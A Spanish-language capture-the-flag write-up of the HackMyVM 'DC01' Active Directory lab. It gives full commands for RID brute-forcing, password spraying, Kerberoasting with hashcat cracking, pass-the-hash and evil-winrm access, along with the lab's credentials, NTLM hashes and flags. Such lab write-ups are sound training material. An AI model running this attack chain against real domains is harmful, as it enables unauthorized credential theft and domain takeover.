# DC01

___
Tags: #AD #PasswordSpraying #crackmapexec
___
# Nombre de la máquina
## Información General

**- Dificultad:** Medium
**- Sistema operativo:** Window
**- Vulnerabilidad explotada.** Missconfiguration 
**- Fecha de resolución:** 06/05/2026
**- Enlace:** 
## Reconocimiento

**Hackmyvm** nos proporciona la ip de la máquina objetivo **192.168.0.107**

**ARP-SCAN**

Ejecutamos el siguiente comando:

```
sudo arp-scan -I eth0 --localnet --ignoredups
```

![[Preparación de eCPPTv3/Machine/Hackmyvm/DC01/images/arpscan.png]]

### Ping

Dependiendo del resultado podemos deducir si es una máquina linux o window, por ejemplo:

```
ping -c 1 192.168.0.107
```

**Su ttl es 128. Por tanto, es Window**
## Enumeración
### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 192.168.0.107
```

```bash
PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 128 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2026-05-06 03:12:37Z)
135/tcp   open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 128 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  tcpwrapped   syn-ack ttl 128
464/tcp   open  kpasswd5?    syn-ack ttl 128
593/tcp   open  ncacn_http   syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 128
3268/tcp  open  ldap         syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 128
5985/tcp  open  http         syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       syn-ack ttl 128 .NET Message Framing
49664/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49677/tcp open  ncacn_http   syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
49725/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49786/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
```

Al comprobar el puerto 445 abierto nos informaremos que nombre tiene su dominio usando **crackmapexec**

```
crackmapexec smb 192.168.0.107 -u 'guest' -p ''
```

![[crackmapexec.png]]

Por tanto la **192.168.0.107** y su dominio sería **SOUPEDECODE.LOCAL**  y lo registraremos en el fichero **/etc/hosts/**

```
crackmapexec smb 192.168.0.107 -u 'guest' -p '' --shares
```

![[IPC.png]]

```
crackmapexec smb 192.168.0.107 -u 'guest' -p '' --rid-brute
```

**--rid-brute**: Opción que sirve para enumerar usuarios en un sistema WINDOWS remoto mediante fuerta bruta de los RIDs (Relative Identifiers).               

![[-rid-brute.png]]

Guardamos todos los usuarios en **user.txt** y realizamos el siguiente comando para obtener solamente el nombre de los usuarios 

```
cat user.txt | tr '\\' ' ' | awk '{print $7}' > user1.txt
```

## Explotación

Luego realizaremos el siguiente comando que consiste en un **Password Spraying** con crackmapexec

```
crackmapexec smb 192.168.0.107 -u 'user1.txt' -p 'user1.txt' --no-bruteforce --continue-on-success
```

SMB         192.168.0.107   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 

Las credenciales son **ybob317:ybob317** 

Usando la herramienta psexec podemos comprobar si las credenciales son efectivas.

```
impacket-psexec SOUPEDECODE.LOCAL/ybob317:ybob317@192.168.0.107
```

![[psexec.png]]

Si es valido las credenciales pero no tienen permiso de admin.

A continuación usaremos una herramienta de impacket llamada **GetUserSPNs**  que se encarga de enumerar cuentas con SPNs (Service Principal Namess) y que obtiene ticket kerberos sin la necesidad que la cuenta tenga permisos de admin

```
impacket-GetUserSPNs -dc-ip 192.168.0.107 SOUPEDECODE.LOCAL/ybob317:ybob317 -request
sudo ntpdate -S SOUPEDECODE.LOCAL
```

Este segundo comando lo usamos para compaginar la hora de la maquina objetivo sincronizarlo con la misma hora de la maquina atacante ya que los ataques kerberos son muy delicado cuando esta sincronizado

![[kerberos attack.png]]

El unico hash que funcionará es del usuario **file_svc** 

```
hashcat -m 13100 hash_filesvc /usr/share/wordlists/rockyou.txt
```

Por tanto, las credenciales quedarían como:

**file_svc**:**Password123!!**

### USER --> ybob317

Para conseguir la primera flag haremos lo siguiente:

Empezamos que carpeta tenemos permiso de lectura usando la herramienta **crackmapexec**

```
 crackmapexec smb 192.168.0.107 -u 'ybob317' -p 'ybob317' --shares
```

![[users-ybob.png]]

Luego, para navegar dentro de la carpeta usaremos la herramienta **smbmap**

```
smbmap -u 'ybob317'  -p 'ybob317' -d 'SOUPEDECODE.LOCAL'  -H 192.168.0.107 -r 'Users'
```

![[ybob3317.png]]

```
smbmap -u 'ybob317'  -p 'ybob317' -d 'SOUPEDECODE.LOCAL'  -H 192.168.0.107 -r 'Users/ybob317'
```

![[Desktooop.png]]

```
smbmap -u 'ybob317'  -p 'ybob317' -d 'SOUPEDECODE.LOCAL'  -H 192.168.0.107 -r 'Users/ybob317/Desktop'
```

![[userrr.txt.png]]

Con el siguiente comando descargamos **user.txt** del usario **ybob317**

```
smbmap -u 'ybob317'  -p 'ybob317' -d 'SOUPEDECODE.LOCAL'  -H 192.168.0.107 --download 'Users/ybob317/Desktop/user.txt'
```

**flag usuario**: 6bab1f09a7403980bfeb4c2b412be47b
### USER --> file_svc 

```
crackmapexec smb 192.168.0.107 -u 'file_svc' -p 'Password123!!'  
```

![[ok user.png]]

```
smbmap -u 'file_svc' -p 'Password123!!' -d 'SOUPEDECODE.LOCAL' -H 192.168.0.107 -r 'backup'
```

![[backuppp.png]]

Con el siguiente comando descargamos el **backup_extract.txt**

```
smbmap -u 'file_svc' -p 'Password123!!' -d 'SOUPEDECODE.LOCAL' -H 192.168.0.107 --download 'backup/backup_extract.txt'
```

![[Preparación de eCPPTv3/Machine/Hackmyvm/DC01/images/Hash NTLM.png]]

### USER --> FileServer$ 

Vamos a probar con un `Pass the Hash` con estos usuarios, dando exitoso `FileServer$`:

```
crackmapexec smb 192.168.0.107 -u 'FileServer$' -H 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559'
```

El ataque **Pass-the-Hash (PtH)** es una técnica de **movimiento lateral** y robo de credenciales que permite a un atacante autenticarse en servidores o servicios remotos utilizando el **hash** de la contraseña de un usuario, en lugar de la contraseña en texto plano. En entornos Windows, las contraseñas no se almacenan ni se envían por la red como texto claro, sino como una representación matemática llamada **hash NTLM**. Dado que el sistema de autenticación acepta este hash como prueba de identidad válida, el atacante no necesita descifrarlo: simplemente lo "pasa" al servicio para iniciar sesión.

![[fileservers$.png]]

Al ser (Pwn3d!) signfica que el usuario tiene permiso de administrador!!

Al tener el puerto **5985** podemos usar la herramienta **evil-wirm** probamos el usuario **FileServer$** con su hashNTLM

```
evil-winrm -i 192.168.0.107 -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'
cd \Users\Administrator\desktop
cat root.txt
```

**root**: a9564ebc3289b7a14551baf8ad5ec60a
## Conclusión

La máquina **DC01** representa un escenario clásico de escalada en Active Directory mal configurado. La cadena de ataque demuestra cómo un fallo de seguridad simple (usuario con la misma contraseña) puede ser el punto de apoyo necesario para pivotar hacia cuentas de servicio, robar hashes de alto valor y finalmente comprometer todo el dominio.

El uso de herramientas como **Crackmapexec** e **Impacket**  fue fundamental para mapear y explotar las relaciones de confianza del directorio activo.